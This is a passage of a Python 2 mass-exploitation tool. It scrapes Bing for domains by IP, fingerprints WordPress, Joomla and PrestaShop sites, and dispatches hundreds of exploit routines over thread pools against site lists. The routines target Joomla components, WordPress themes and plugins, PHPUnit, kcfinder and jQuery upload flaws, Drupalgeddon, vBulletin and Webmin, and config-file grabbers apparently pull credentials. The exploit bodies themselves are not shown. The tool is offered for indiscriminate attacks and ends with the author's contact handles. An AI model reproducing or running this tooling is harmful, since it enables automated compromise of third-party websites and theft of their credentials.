						open('IP.txt', 'a').write(IP2+'\n')
				except:
					pass


	def grabip(self):
		ooke = raw_input("List IP : ")
		ooke = open(ooke, 'r')
		for zzz in ooke:
			bo = []
			lonk = 1
			while lonk < 299:
				bingung = "http://www.bing.com/search?q=IP%3A"+zzz+"+&count=50&first="+str(lonk)
				iyagw = requests.get(bingung,verify=False,headers=headers)
				gans = iyagw.content
				ya = re.findall('<h2><a href="(.*?)"', gans)
				for z in ya:
					o = z.split('/')
					if (o[0]+'//'+o[2]) in bo:
						pass
					else:
						bo.append(o[0]+'//'+o[2])
						print '[{}>>>{}]'.format(fm,fp), (o[0]+'//'+o[2])
						with open('Grab.txt','a') as s:
							s.writelines((o[0]+'//'+o[2])+'\n')
				lonk = lonk+50

class CMSCHECKER:
	def WordPressCheck(self, url):
		try:
			CheckOne = (url+'/readme.html')
			CheckTwo = (url+'/wp-content/uploads/')
			CheckThree = (url+'/wp-admin/upgrade.php')
			CheckFour = (url+'/wp-login.php')
			CheckFive = (url)
			R1 = requests.get(CheckOne, headers=headers, timeout=9)
			R2 = requests.get(CheckTwo, headers=headers, timeout=9)
			R3 = requests.get(CheckThree, headers=headers, timeout=9)
			R4 = requests.get(CheckFour, headers=headers, timeout=9)
			R5 = requests.get(CheckFive, headers=headers, timeout=9)
			if R1.status_code == 200 and ('WordPress' and 'https://wordpress.org/') in R1.content:
				print('[{}WordPress{}] {}'.format(fi,fp,url))
				open('CMS/WordPress.txt', 'a').write(url+'\n')
			elif R2.status_code == 200 and ('Index of /wp-content/uploads/' and 'Parent Directory') in R2.content:
				print('[{}WordPress{}] {}'.format(fi,fp,url))
				open('CMS/WordPress.txt', 'a').write(url+'\n')
			elif R3.status_code == 200 and ('WordPress' and 'https://wordpress.org/') in R3.content:
				print('[{}WordPress{}] {}'.format(fi,fp,url))
				open('CMS/WordPress.txt', 'a').write(url+'\n')
			elif R4.status_code == 200 and ('wp-submit' and 'user_login') in R4.content:
				print('[{}WordPress{}] {}'.format(fi,fp,url))
				open('CMS/WordPress.txt', 'a').write(url+'\n')
			elif R5.status_code == 200 and '/wp-content' in R5.content:
				print('[{}WordPress{}] {}'.format(fi,fp,url))
				open('CMS/WordPress.txt', 'a').write(url+'\n')
			else:
				print('[{}UNKNOW{}] {}'.format(fm,fp,url))
		except:
			print('[{}TIMEOUT{}] {}'.format(fm,fp,url))
			pass
	def JoomlaCheck(self, url):
		try:
			C = (url+'/administrator/')
			CC = (url+'/readme.txt')
			CCC = (url+'/media/com_joomlaupdate/')
			CCCC = (url)
			R = requests.get(C, headers=headers, timeout=9)
			RR = requests.get(CC, headers=headers, timeout=9)
			RRR = requests.get(CCC, headers=headers, timeout=9)
			RRRR = requests.get(CCCC, headers=headers, timeout=9)
			if R.status_code == 200 and 'mod-login-username' in R.content:
				print('[{}Joomla{}] {}'.format(fi,fp,url))
				open('CMS/Joomla.txt', 'a').write(url+'\n')
			elif RR.status_code == 200 and 'joomla' in RR.content or 'Joomla' in RR.content:
				print('[{}Joomla{}] {}'.format(fi,fp,url))
				open('CMS/Joomla.txt', 'a').write(url+'\n')
			elif RRR.status_code == 200 and 'Index of /media/com_joomlaupdate' in RRR.content:
				print('[{}Joomla{}] {}'.format(fi,fp,url))
				open('CMS/Joomla.txt', 'a').write(url+'\n')
			elif RRRR.status_code == 200 and 'joomla' in RRRR.content or 'Joomla' in RRRR.content:
				print('[{}Joomla{}] {}'.format(fi,fp,url))
				open('CMS/Joomla.txt', 'a').write(url+'\n')
			else:
				print('[{}UNKNOW{}] {}'.format(fm,fp,url))
		except:
			print('[{}TIMEOUT{}] {}'.format(fm,fp,url))
			pass
	def PrestaShopCheck(self, url):
		try:
			B = (url+'/robots.txt')
			BB = (url+'/README.md')
			BBB = (url)
			E = requests.get(B, headers=headers, timeout=9)
			EE = requests.get(BB, headers=headers, timeout=9)
			EEE = requests.get(BBB, headers=headers, timeout=9)
			if E.status_code == 200 and 'PrestaShop' in E.content or 'http://www.prestashop.com' in E.content:
				print('[{}PrestaShop{}] {}'.format(fi,fp,url))
				open('CMS/PrestaShop.txt', 'a').write(url+'\n')
			elif EE.status_code == 200 and ('PrestaShop' and 'Installation') in EE.content:
				print('[{}PrestaShop{}] {}'.format(fi,fp,url))
				open('CMS/PrestaShop.txt', 'a').write(url+'\n')
			elif EEE.status_code == 200 and '<meta name="generator" content="PrestaShop" />' in EEE.content:
				print('[{}PrestaShop{}] {}'.format(fi,fp,url))
				open('CMS/PrestaShop.txt', 'a').write(url+'\n')
			else:
				print('[{}UNKNOW{}] {}'.format(fm,fp,url))
		except:
			print('[{}TIMEOUT{}] {}'.format(fm,fp,url))
			pass









C = CMSCHECKER()

def CCCCC(url):
	try:
		B = url
		C.WordPressCheck(B)
		C.JoomlaCheck(B)
		C.PrestaShopCheck(B)
	except:
		pass



Dorkerrr = males()
JJJ = J00mla()
PR = PrestaShop()
OT = Others()
Nels = Con()
WP = WordPress()
WBMIN = Webmin()
def J(url):
	try:
		PP = url
		JJJ.b2jjoom(PP)
		JJJ.b2j2joom(PP)
		JJJ.fabrikjoom(PP)
		JJJ.fabrikjoom2(PP)
		JJJ.jcejoom(PP)
		JJJ.jdownloadjoom(PP)
		JJJ.jdownloadjoom2(PP)
		JJJ.oziogalljoom(PP)
		JJJ.oziogalljoom2(PP)
		JJJ.oziogalljoom3(PP)
		JJJ.jbcatjoom(PP)
		JJJ.jbcatjoom2(PP)
		JJJ.jbcatjoom3(PP)
		JJJ.jbcatjoom4(PP)
		JJJ.modsocjoom(PP)
		JJJ.modsocjoom2(PP)
		JJJ.adsmjoom(PP)
		JJJ.adsmjoom2(PP)
		JJJ.adsmjoom3(PP)
		JJJ.adsmjoom4(PP)
		JJJ.sexyjoom(PP)
		JJJ.sexyjoom2(PP)
		JJJ.sexyjoom3(PP)
		JJJ.myblogjoom(PP)
		JJJ.rockjoom(PP)
		JJJ.rockjoom3(PP)
		JJJ.simphojoom(PP)
		JJJ.simphojoom2(PP)
		JJJ.extplojoom(PP)
		JJJ.extplojoom2(PP)
		JJJ.megajoom(PP)
		JJJ.megajoom2(PP)
		JJJ.btportjoom(PP)
		JJJ.btportjoom2(PP)
		JJJ.jwalljoom(PP)
		JJJ.jwalljoom2(PP)
		JJJ.jwalljoom3(PP)
		JJJ.redmyjoom(PP)
		JJJ.redmyjoom2(PP)
		JJJ.redmyjoom3(PP)
		JJJ.facilejoom(PP)
		JJJ.facilejoom2(PP)
		JJJ.civijoom(PP)
		JJJ.civijoom2(PP)
		JJJ.civijoom3(PP)
		JJJ.maianjoom(PP)
		JJJ.maianjoom2(PP)
		JJJ.maianjoom3(PP)
		JJJ.acymailjoom(PP)
		JJJ.acymailjoom2(PP)
		JJJ.acymailjoom3(PP)
		JJJ.jnewsjoom(PP)
		JJJ.jnewsjoom2(PP)
		JJJ.jincjoom(PP)
		JJJ.jincjoom2(PP)
		JJJ.maianmediajoom(PP)
		JJJ.maianmediajoom2(PP)
		JJJ.jnewssjoom(PP)
		JJJ.jnewssjoom2(PP)
		JJJ.agorajoom(PP)
		JJJ.agorajoom2(PP)
		JJJ.mtree2joom(PP)
		JJJ.novajoom2(PP)
		JJJ.collectorjoom(PP)
		JJJ.osprojoom(PP)
		JJJ.osprojoom2(PP)
		JJJ.ksadvjoom(PP)
		JJJ.hwdvidjoom(PP)
		JJJ.hwdvidjoom2(PP)
		JJJ.djclassjoom(PP)
		JJJ.djclassjoom2(PP)
	except:
		pass
def WB(url):
	try:
		KK = url
		WBMIN.Webmin1920(KK)
		WBMIN.Webmin1920B(KK)
		WBMIN.Webmin2(KK)
		WBMIN.Webmin3(KK)
		WBMIN.Webmin4(KK)
		WBMIN.Webmin22(KK)
		WBMIN.Webmin32(KK)
		WBMIN.Webmin33(KK)
		WBMIN.Webmin34(KK)
		WBMIN.Webmin5(KK)
	except:
		pass

def OTT(url):
	try:
		LIL = url
		OT.jqueryfilerb(LIL)
		OT.jqueryfiler2(LIL)
		OT.jqueryfiler3(LIL)
		OT.jqueryfiler4(LIL)
		OT.jqueryfiler5(LIL)
		OT.jqueryfiler6(LIL)
		OT.jqueryfiler7(LIL)
		OT.jqueryfiler8(LIL)
		OT.jqueryfiler9(LIL)
		OT.jqueryfiler10(LIL)
		OT.jqueryfiler11(LIL)
		OT.jqueryfiler12(LIL)
		OT.jqueryfiler13(LIL)
		OT.jqueryfiler14(LIL)
		OT.jqueryfiler(LIL)
		OT.jqueryfileup(LIL)
		OT.jqueryfileup2(LIL)
		OT.jqueryfileup3(LIL)
		OT.jqueryfileup4(LIL)
		OT.jqueryfileup5(LIL)
		OT.jqueryfileup6(LIL)
		OT.jqueryfileup7(LIL)
		OT.jqueryfileup8(LIL)
		OT.dropzone(LIL)
		OT.phpunit(LIL)
		OT.phpunit1(LIL)
		OT.phpunit2(LIL)
		OT.phpunit4(LIL)
		OT.phpunit5(LIL)
		OT.phpunit6(LIL)
		OT.phpunit7(LIL)
		OT.phpunit8(LIL)
		OT.vbulletinrce(LIL)
		OT.kcfinder(LIL)
		OT.kcfinder2(LIL)
		OT.kcfinder3(LIL)
		OT.kcfinder31(LIL)
		OT.kcfinder4(LIL)
		OT.kcfinder41(LIL)
		OT.kcfinder5(LIL)
		OT.kcfinder51(LIL)
		OT.kcfinder6(LIL)
		OT.kcfinder61(LIL)
		OT.kcfinder7(LIL)
		OT.kcfinder71(LIL)
		OT.kcfinder8(LIL)
		OT.kcfinder81(LIL)
		OT.kcfinder9(LIL)
		OT.kcfinder91(LIL)
		OT.kcfinder10(LIL)
		OT.kcfinder101(LIL)
		OT.kcfinder102(LIL)
		OT.kcfinder103(LIL)
		OT.simogeo(LIL)
		OT.osco(LIL)
		OT.array(LIL)
		OT.dfac(LIL)
		OT.vephoto(LIL)
		OT.tpl(LIL)
		OT.filecms(LIL)
		OT.keybase(LIL)
		OT.andr(LIL)
	except:
		pass
def PRSTP(url):
	try:
		O = url
		PR.pkvert(O)
		PR.pkvert2(O)
		PR.nvmex(O)
		PR.nvmex2(O)
		PR.tdps(O)
		PR.tdps2(O)
		PR.psmod(O)
		PR.psmod2(O)
		PR.redactor(O)
		PR.redactor2(O)
		PR.blocktesti(O)
		PR.wg24(O)
		PR.attri3(O)
		PR.advance(O)
		PR.carta(O)
		PR.vid(O)
		PR.fieldmm(O)
		PR.fieldmm2(O)
		PR.order(O)
		PR.order2(O)
		PR.pkflex(O)
		PR.pkflex2(O)
		PR.columnad(O)
		PR.columnad2(O)
		PR.homepagead(O)
		PR.homepagead2(O)
		PR.propagead(O)
		PR.propagead2(O)
		PR.simpleslide(O)
		PR.simpleslide2(O)
		PR.vtemslide(O)
		PR.realty(O)
		PR.realty2(O)
		PR.realty3(O)
		PR.realty4(O)
		PR.premeg(O)
		PR.premeg2(O)
		PR.soof(O)
		PR.soof2(O)
		PR.soof3(O)
		PR.soof4(O)
		PR.fupload(O)
		PR.jro(O)
		PR.jro2(O)
		PR.leo(O)
		PR.leo2(O)
		PR.leo3(O)
		PR.kitter(O)
		PR.kitter2(O)
		PR.add(O)
		PR.addthis(O)
		PR.attri(O)
		PR.attriold(O)
	except:
		pass

def DorRce(url):
	try:
		Lo = url
		Drup.drupal8restful(Lo)
		Drup.drupal8restfulb(Lo)
		Drup.drupal8restfulb2(Lo)
		Drup.Drupal8BNode(Lo)
		Drup.Drupal8BNode2(Lo)
		Drup.Drupal8BNode3(Lo)
		Drup.Drupal8NodeRand(Lo)
		Drup.Drupal8Auth(Lo)
		Drup.Drupal8Auth2(Lo)
		Drup.Drupal8Auth3(Lo)
		Drup.Drupal7Geddon(Lo)
		Drup.Drupal7Geddon2(Lo)
		Drup.Drupal7Geddon3(Lo)
	except:
		pass
def Wor(url):
	try:
		L = url
		WP.buddywp(L)
		WP.buddywp2(L)
		WP.Woocommerce_PHPUnit(L)
		WP.Realia_PHPUnit(L)
		WP.Jekyll_PHPUnit(L)
		WP.Prh_Api_PHPUnit(L)
		WP.MM_PHPUnit(L)
		WP.Enfold_Child(L)
		WP.DZS_PHPUnit(L)
		WP.Contabileads_PHPUnit(L)
		WP.Cloudflare(L)
		WP.HD_Webplayer(L)
		WP.Cameleon(L)
		WP.Agritourismo(L)
		WP.Bordeaux(L)
		WP.Bulteno(L)
		WP.Oxygen(L)
		WP.Radial(L)
		WP.Rayoflight(L)
		WP.Reganto(L)
		WP.Rockstar(L)
		WP.Qualifire(L)
		WP.Ghost(L)
		WP.Anthology(L)
		WP.Kiddo(L)
		WP.Thisway(L)
		WP.Udesign(L)
		WP.Themify1(L)
		WP.Themify2(L)
		WP.Themify3(L)
		WP.Themify4(L)
		WP.Themify5(L)
		WP.themify6(L)
		WP.themify7(L)
		WP.themify8(L)
		WP.themify9(L)
		WP.rightnow(L)
		WP.coldfusion(L)
		WP.magicfields(L)
		WP.konzept(L)
		WP.dancestudio(L)
		WP.cubed(L)
		WP.amplus(L)
		WP.highlight(L)
		WP.dandelion(L)
		WP.satoshi(L)
		WP.evolve(L)
		WP.saico(L)
		WP.synoptic(L)
		WP.synoptic2(L)
		WP.clockstone(L)
		WP.andre(L)
		WP.rarebird(L)
		WP.designplus(L)
		WP.pindol(L)
		WP.cuckootap(L)
		WP.beach_apollo(L)
		WP.centum(L)
		WP.medicate(L)
		WP.money(L)
		WP.bet(L)
		WP.flipbook(L)
		WP.wpstorecart(L)
		WP.dzsvideogallery(L)
		WP.adsmanager(L)
		WP.wpproperty(L)
		WP.cherry(L)
		WP.cherry2(L)
		WP.tevolution(L)
		WP.showbiz(L)
		WP.userupload(L)
		WP.assetmanager(L)
		WP.cnhk(L)
		WP.cstmbckgrn(L)
		WP.workthe(L)
		WP.workthe2(L)
		WP.category(L)
		WP.category2(L)
		WP.assg(L)
		WP.wpmobile(L)
		WP.devtools2(L)
		WP.genesis(L)
		WP.acffrontend(L)
		WP.picaphoto(L)
		WP.formcraft(L)
		WP.wpshop(L)
		WP.pitchprint(L)
		WP.sexy(L)
		WP.barclaycart(L)
		WP.reflexgal(L)
		WP.snetworking(L)
		WP.revslider(L)
		WP.woocommerup(L)
		WP.stnews(L)
		WP.phpevent(L)
		WP.blaze(L)
		WP.symposium(L)
		WP.copysafe(L)
		WP.wpuserf(L)
		WP.mobilef(L)
		WP.viralop(L)
		WP.secfiles(L)
		WP.checkout(L)
		WP.purevision(L)
		WP.multimedia(L)
		WP.inmarketing(L)
		WP.fileupload(L)
		WP.logosware(L)
		WP.dzszsound(L)
		WP.iphone(L)
		WP.levoslide(L)
		WP.jssorup(L)
		WP.wysija(L)
		WP.lineexplo(L)
		WP.addblocker(L)
		WP.pageline(L)
		WP.gravity(L)
		WP.mail(L)
		WP.ajaxform(L)
		WP.wpinstall(L)
		WP.wpinstall2(L)
	except:
		pass

def Sup(url):
	try:
		k = url
		Nels.Laravel(k)
		Nels.Hdflvplayer_Config(k)
		Nels.Cckjseblod_Config(k)
		Nels.Joomanager_Config(k)
		Nels.Aceftp_Config(k)
		Nels.Jtagmember_Config(k)
		Nels.Macgallery_Config(k)
		Nels.FaceGallery_Config(k)
		Nels.S5_Media_Player_Config(k)
		Nels.Docman_Config(k)
		Nels.Dvfolder_Config(k)
		Nels.Addproperty_Config(k)
		Nels.Contush_Config(k)
		Nels.Jet_Config(k)
		Nels.Product_Module_Config(k)
		Nels.WD_Config(k)
		Nels.Jat3_Config(k)
		Nels.Comunity_Config(k)
		Nels.Download_Monitor_Config(k)
		Nels.JW_Config(k)
		Nels.WP_eCommerce_Config(k)
		Nels.Revslider_Config(k)
		Nels.WP_Support_Responsive_Config(k)
		Nels.Eshop_Magic_Config(k)
		Nels.Ungallery_Config(k)
		Nels.Membership_Config(k)
		Nels.Mac_Photo_Gallery_Config(k)
		Nels.Acento_Config(k)
		Nels.Ajax_Store_Config(k)
		Nels.Antioch_Config(k)
		Nels.Authentic_Config(k)
		Nels.Churchope_Config(k)
		Nels.Epic_Config(k)
		Nels.Felis_Config(k)
		Nels.Force_Config(k)
		Nels.HD_Audio_Config(k)
		Nels.History_Collection_Config(k)
		Nels.Image_Export_Config(k)
		Nels.Kbslider_Config(k)
		Nels.Linenity_Config(k)
		Nels.Lote27_Config(k)
		Nels.Markant_Config(k)
		Nels.Michael_Canthony_Config(k)
		Nels.NativeChurch_Config(k)
		Nels.Parallelus_Config(k)
		Nels.RedSteel_Config(k)
		Nels.S3bubble_Config(k)
		Nels.SMWF_Config(k)
		Nels.TheLoft_Config(k)
		Nels.WP_eCommerce_Config(k)
		Nels.Revslider_Config(k)
		Nels.WP_Support_Responsive_Config(k)
		Nels.Eshop_Magic_Config(k)
		Nels.Ungallery_Config(k)
		Nels.Membership_Config(k)
		Nels.Mac_Photo_Gallery_Config(k)
		Nels.Acento_Config(k)
		Nels.Ajax_Store_Config(k)
		Nels.Antioch_Config(k)
		Nels.Authentic_Config(k)
		Nels.Churchope_Config(k)
		Nels.Epic_Config(k)
		Nels.Felis_Config(k)
		Nels.Force_Config(k)
		Nels.HD_Audio_Config(k)
		Nels.History_Collection_Config(k)
		Nels.Image_Export_Config(k)
		Nels.Kbslider_Config(k)
		Nels.Linenity_Config(k)
		Nels.Lote27_Config(k)
		Nels.Markant_Config(k)
		Nels.Michael_Canthony_Config(k)
		Nels.NativeChurch_Config(k)
		Nels.Parallelus_Config(k)
		Nels.RedSteel_Config(k)
		Nels.S3bubble_Config(k)
		Nels.SMWF_Config(k)
		Nels.TheLoft_Config(k)
	except:
		pass

def Main():
	try:
		if Choss == '1':
			list = raw_input('List : ')
			Thread = raw_input('Thread : ')
			rr = open(list, 'r').read().splitlines()
			start = timer()
			t = Pool(int(Thread))
			t.map(Sup, rr)
		elif Choss == '2':
			list = raw_input('List : ')
			TH = raw_input('Thread : ')
			r = open(list, 'r').read().splitlines()
			start = timer()
			W = Pool(int(TH))
			W.map(Wor, r)
		elif Choss == '3':
			list = raw_input('List : ')
			WBB19 = raw_input('Thread : ')
			wbmn = open(list, 'r').read().splitlines()
			start = timer()
			W = Pool(int(WBB19))
			W.map(WB, wbmn)
		elif Choss == '4':
			list = raw_input('List : ')
			DRUUU = raw_input('Thread : ')
			drp = open(list, 'r').read().splitlines()
			start = timer()
			D = Pool(int(DRUUU))
			D.map(PRSTP, drp)
		elif Choss == '6':
			Bruter()
		elif Choss == '5':
			list = raw_input('List : ')
			O = raw_input('Thread : ')
			orato = open(list, 'r').read().splitlines()
			start = timer()
			TTT = Pool(int(O))
			TTT.map(OTT, orato)
		elif Choss == '7':
			Dorkerrr.randomdomen()
		elif Choss == '8':
			Dorkerrr.getIP()
		elif Choss == '9':
			Dorkerrr.grabip()
		elif Choss == '10':
			list = raw_input('List : ')
			J000 = raw_input('Thread : ')
			J0J = open(list, 'r').read().splitlines()
			start = timer()
			JM = Pool(int(J000))
			JM.map(J, J0J)
		elif Choss == '99':
			baba = raw_input("""
Telegram: https://t.me/Nelssshere
Icq: https://icq.im/NelsHere
Facebook: https://www.facebook.com/fadiel.s.new""")
		elif Choss == '11':
			list = raw_input('List : ')
			CC = open(list, 'r').read().splitlines()
			start = timer()
			CH = Pool(100)
			CH.map(CCCCC, CC)
	except:
		pass

if __name__ == '__main__':
	Main()
